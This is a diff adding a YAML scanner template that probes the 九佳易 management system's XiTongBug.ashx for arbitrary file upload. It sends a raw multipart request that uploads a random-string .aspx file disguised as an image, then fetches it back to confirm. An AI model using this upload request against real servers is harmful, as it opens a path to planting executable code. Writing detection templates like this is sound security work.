@@ -1,0 +1,58 @@
+id: poc-yaml-jiu-jia-yi-ms-xitongbug-ashx-anyfile-upload
+info:
+  name: 九佳易管理系统 XiTongBug.ashx 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  random_string: "{{rand_base(7)}}"
+  encoded_content: "{{base64(random_string)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /XiTongBug.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{random_string}}.aspx"
+        Content-Type: image/jpeg
+
+        {{encoded_content}}
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+    matchers:
+      - type: word
+        words:
+          - ".aspx"
+        part: body
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: uploaded_file
+        part: body
+        internal: true
+        regex:
+          - "xtdoc/(?P<file>.*?).aspx"
+
+  - raw:
+      - |
+        GET /xtdoc/{{uploaded_file}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{encoded_content}}"
+        part: body
